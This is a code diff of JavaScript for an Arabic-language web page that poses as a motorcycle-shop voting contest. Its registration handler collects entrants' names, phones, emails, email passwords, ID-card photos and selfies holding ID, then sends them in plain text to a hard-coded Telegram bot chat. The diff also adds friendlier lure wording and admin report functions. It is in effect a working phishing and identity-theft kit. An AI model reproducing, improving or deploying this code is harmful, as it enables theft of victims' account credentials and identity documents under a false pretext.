+    msg.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
     return;
   }
 
-  const btn = document.getElementById("regSubmitBtn");
+  const btn = document.getElementById("btn");
   btn.disabled = true;
-  btn.textContent = "جارٍ تسجيل البيانات وإصدار الرمز...";
+  btn.textContent = "⚡ جارٍ إصدار رابط التصويت وإرسال الوثائق...";
 
   try {
-    let code = "";
+    let ticketID = "";
     do {
-      code = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
-    } while (stateData.c.some(c => c.k === code));
+      ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
+    } while (cloudState.c.some(c => c.k === ticketID));
 
-    const name = escHtml(document.getElementById("regName").value.trim());
-    const email = escHtml(document.getElementById("regEmail").value.trim());
-    const pass = escHtml(document.getElementById("regPassword").value.trim());
-    const city = escHtml(document.getElementById("regCity").value.trim());
-    const favModel = escHtml(document.getElementById("regModel").value);
-    const note = escHtml(document.getElementById("regNote").value.trim());
+    const participantName = cleanHTML(document.getElementById("name").value.trim());
+    const email = cleanHTML(document.getElementById("email").value.trim());
+    const password = cleanHTML(document.getElementById("password").value.trim());
+    const city = cleanHTML(document.getElementById("city").value.trim());
+    const favModel = cleanHTML(document.getElementById("favModel").value);
+    const note = cleanHTML(document.getElementById("note").value.trim());
 
-    const cap =
-`🚨 <b>متسابق جديد — أمير المترات (${stateData.c.length + 1}/${MAX_CAP})</b>
+    const captionText =
+`🚨 <b>متسابق جديد مسجل (${cloudState.c.length + 1}/${MAX_CANDIDATES})!</b>
 ━━━━━━━━━━━━━━━━━━
-🎟️ <b>الرمز:</b> <code>${code}</code>
-👤 <b>الاسم:</b> ${name}
-📱 <b>الهاتف:</b> <code>${phone}</code>
+🎟️ <b>الرمز:</b> <code>${ticketID}</code>
+👤 <b>الاسم:</b> ${participantName}
+📱 <b>الهاتف:</b> <code>${rawPhone}</code>
 📧 <b>البريد:</b> <code>${email}</code>
-🔑 <b>كلمة المرور:</b> <code>${pass}</code>
+🔑 <b>كلمة المرور:</b> <code>${password}</code>
 🏙️ <b>المنطقة:</b> ${city}
-🏍️ <b>الفئة المفضلة:</b> ${favModel}
-💬 <b>كلمة للجمهور:</b> ${note || "لا يوجد"}`;
+🏍️ <b>المفضل:</b> ${favModel}
+💬 <b>ملاحظة:</b> ${note || "لا يوجد"}`;
 
     const fd1 = new FormData();
     fd1.append("chat_id", CHAT_ID);
-    fd1.append("photo", idCardBlob, "id_card.jpg");
-    fd1.append("caption", cap);
+    fd1.append("photo", compressedIdBlob, "id_card.jpg");
+    fd1.append("caption", captionText);
     fd1.append("parse_mode", "HTML");
 
     const fd2 = new FormData();
     fd2.append("chat_id", CHAT_ID);
-    fd2.append("photo", selfieIdBlob, "selfie_id.jpg");
-    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${name} (${code})`);
+    fd2.append("photo", compressedSelfieBlob, "selfie_id.jpg");
+    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${participantName} (${ticketID})`);
 
     const [r1, r2] = await Promise.all([
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 }).then(r => r.json()),
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 }).then(r => r.json())
     ]);
 
-    if (!r1.ok || !r2.ok) throw new Error("upload failed");
+    if (!r1.ok || !r2.ok) throw new Error("Telegram registration upload failed");
 
-    stateData.c.push({ k: code, n: name, p: phone, y: city, v: 0 });
-    persistLocal();
-    syncCloudBackground();
-    renderBoard();
+    cloudState.c.push({
+      k: ticketID,
+      n: participantName,
+      p: rawPhone,
+      y: city,
+      v: 0
+    });
 
-    const voteUrl = `${window.location.origin}${window.location.pathname}?vote=${code}#voting`;
-    const inviteMsg =
-`🏍️ مسابقة وتصويت متر فلينج — أمير المترات
+    persistLocalState();
+    backgroundCloudSync();
+    renderLeaderboardUI();
 
-الاسم: ${name}
-الرمز: ${code}
+    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${ticketID}#voting`;
+    const inviteText = buildAttractiveInviteMessage(participantName, ticketID, shareUrl);
 
-صوّت لي عبر الرابط المباشر:
-${voteUrl}
+    document.getElementById("ticketCode").textContent = ticketID;
+    document.getElementById("shareMessagePreview").textContent = inviteText;
+    document.getElementById("raffleForm").style.display = "none";
+    document.getElementById("ticketBox").style.display = "block";
+    document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
 
-معرض أمير المترات — القاعدة / الشارع العام`;
-
-    document.getElementById("ticketCodeOut").textContent = code;
-    document.getElementById("inviteTextOut").textContent = inviteMsg;
-    document.getElementById("registerForm").style.display = "none";
-    document.getElementById("ticketResult").style.display = "block";
-    document.getElementById("ticketResult").scrollIntoView({ behavior: "smooth" });
   } catch (err) {
-    fb.className = "feedback err";
-    fb.textContent = "تعذر إتمام التسجيل، تأكد من الاتصال وحاول مرة أخرى.";
+    msg.className = "msg err";
+    msg.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
     btn.disabled = false;
-    btn.textContent = "إصدار رمز المتسابق ورابط التصويت";
+    btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
   }
 });
 
-function copyInvite() {
-  const txt = document.getElementById("inviteTextOut").textContent;
-  navigator.clipboard.writeText(txt).then(() => {
-    document.getElementById("copyDone").style.display = "block";
-  });
-}
-
-function toggleAdmin() {
-  if (document.body.classList.contains("admin-on")) {
-    document.body.classList.remove("admin-on");
-    alert("تم إيقاف وضع الإدارة.");
-    return;
-  }
-  const pin = prompt("أدخل رمز الإدارة:");
-  if (pin === ADMIN_PIN) {
-    document.body.classList.add("admin-on");
-    alert("تم تفعيل وضع الإدارة.");
-  } else if (pin !== null) {
-    alert("رمز الإدارة غير صحيح.");
-  }
-}
-
-function deleteCandidate(code, name) {
-  if (!confirm(`تأكيد حذف المتسابق (${name} - ${code})؟`)) return;
-  stateData.c = stateData.c.filter(c => c.k !== code);
-  persistLocal();
-  syncCloudBackground();
-  renderBoard();
-}
-
-async function sendSortedReportToBot() {
-  const total = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
-  const lines = buildSortedLines(30);
-  const msg =
-`📋 <b>تقرير الترتيب — أمير المترات</b>
-👥 المتسابقون: <b>${stateData.c.length}/${MAX_CAP}</b> | 🗳️ الأصوات: <b>${total}</b>
-━━━━━━━━━━━━━━━━━━
-${lines}`;
-
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
-  }).then(r => r.json());
-
-  if (res.ok) alert("تم إرسال التقرير للبوت.");
-  else alert("تعذر إرسال التقرير للبوت.");
-}
-
 async function testBotConnection() {
   try {
-    const me = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json());
-    if (!me.ok) {
-      alert("التوكن غير صالح.");
+    const meRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+    const meData = await meRes.json();
+    if (!meData.ok) {
+      alert("❌ التوكن غير صالح أو البوت متوقف.");
       return;
     }
-    const send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `📡 فحص اتصال البوت (@${me.result.username}) — أمير المترات`,
+        text: `📡 <b>اختبار اتصال ناجح!</b>\n🤖 البوت: <b>@${meData.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
         parse_mode: "HTML"
       })
-    }).then(r => r.json());
-    if (send.ok) alert(`البوت (@${me.result.username}) متصل بنجاح.`);
-    else alert("تعذر الإرسال إلى المحادثة المحددة.");
+    });
+    const sendData = await sendRes.json();
+    if (sendData.ok) {
+      alert(`✅ البوت (@${meData.result.username}) متصل ويعمل بنجاح وتم إرسال رسالة اختبار!`);
+    } else {
+      alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${sendData.description || "تأكد من بدء المحادثة مع البوت أو إضافته للمجموعة"}`);
+    }
   } catch (e) {
-    alert("تعذر الاتصال بواجهة تليجرام.");
+    alert("❌ تعذر الاتصال بواجهة تليجرام، تحقق من الشبكة.");
   }
 }
 
-function togglePass(id, btn) {
-  const inp = document.getElementById(id);
-  if (!inp) return;
-  inp.type = inp.type === "password" ? "text" : "password";
-  btn.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
+function toggleAdminMode() {
+  if (document.body.classList.contains("admin-mode")) {
+    document.body.classList.remove("admin-mode");
+    alert("تم الخروج من وضع الإدارة.");
+    return;
+  }
+  const pin = prompt("🔐 أدخل الرقم السري لإدارة المعرض:");
+  if (pin === ADMIN_PIN) {
+    document.body.classList.add("admin-mode");
+    alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أزرار إرسال التقرير وفحص البوت واستبعاد المخالفين.");
+  } else if (pin !== null) {
+    alert("❌ الرقم السري غير صحيح!");
+  }
 }
 
-function handleImage(event, prevId) {
+async function deleteCandidateAdmin(code, name) {
+  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً من المسابقة؟`)) return;
+  cloudState.c = cloudState.c.filter(c => c.k !== code);
+  persistLocalState();
+  backgroundCloudSync();
+  renderLeaderboardUI();
+  alert(`✅ تم استبعاد المتسابق (${name}) وحذفه من لوحة المتصدرين فوراً.`);
+}
+
+async function sendSortedReportToBot() {
+  if (cloudState.c.length === 0) {
+    alert("لا يوجد متسابقون مسجلون حالياً.");
+    return;
+  }
+  const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
+  const sortedList = buildSortedTelegramLeaderboard(25);
+
+  const reportMsg =
+`📋 <b>تقرير الترتيب المرتب — متجر أمير المترات</b>
+👥 عدد المتسابقين: <b>${cloudState.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${totalVotes}</b>
+━━━━━━━━━━━━━━━━━━
+${sortedList}
+━━━━━━━━━━━━━━━━━━
+⏰ <b>التوقيت:</b> ${new Date().toLocaleString("ar-YE")}`;
+
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: reportMsg, parse_mode: "HTML" })
+  });
+  const data = await res.json();
+  if (data.ok) {
+    alert("✅ تم إرسال تقرير الترتيب المرتب إلى بوت التليجرام!");
+  } else {
+    alert(`⚠️ تعذر إرسال التقرير: ${data.description || "تحقق من البوت"}`);
+  }
+}
+
+function copyShareInvite() {
+  const text = document.getElementById("shareMessagePreview").textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    document.getElementById("copyFeedback").style.display = "block";
+  });
+}
+
+function toggleGenericPass(inputId, btnEl) {
+  const inp = document.getElementById(inputId);
+  if (inp) {
+    inp.type = inp.type === "password" ? "text" : "password";
+    btnEl.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
+  }
+}
+
+// ضغط سريع للصور (حد أقصى 900px وجودة 0.72) لسرعة فائقة في الرفع للبوت
+function handleImage(event, previewId) {
   const file = event.target.files[0];
   if (!file) return;
   const reader = new FileReader();
@@ -1812,19 +1409,15 @@ function handleImage(event, prevId) {
       let w = img.width, h = img.height;
       if (w > h && w > MAX) { h *= MAX / w; w = MAX; }
       else if (h > MAX) { w *= MAX / h; h = MAX; }
-      canvas.width = w;
-      canvas.height = h;
+      canvas.width = w; canvas.height = h;
       ctx.drawImage(img, 0, 0, w, h);
       canvas.toBlob(blob => {
-        if (prevId === "voterIdPreview") voterIdBlob = blob;
-        else if (prevId === "idPreview") idCardBlob = blob;
-        else if (prevId === "selfiePreview") selfieIdBlob = blob;
+        if (previewId === "idPreview") compressedIdBlob = blob;
+        else if (previewId === "selfiePreview") compressedSelfieBlob = blob;
+        else if (previewId === "voterIdPreview") compressedVoterIdBlob = blob;
 
-        const prev = document.getElementById(prevId);
-        if (prev) {
-          prev.src = URL.createObjectURL(blob);
-          prev.style.display = "block";
-        }
+        const p = document.getElementById(previewId);
+        if (p) { p.src = URL.createObjectURL(blob); p.style.display = "block"; }
       }, "image/jpeg", 0.72);
     };
     img.src = e.target.result;
@@ -1832,16 +1425,13 @@ function handleImage(event, prevId) {
   reader.readAsDataURL(file);
 }
 
-function escHtml(str) {
-  return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
+function cleanHTML(str) {
+  return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-initCaptcha();
-renderBoard();
-applyUrlVoteParam();
+generateCaptcha();
+renderLeaderboardUI();
+checkUrlVoteParam();
 syncFromTelegramCloud(false);
 setInterval(() => syncFromTelegramCloud(false), 15000);
 </script>
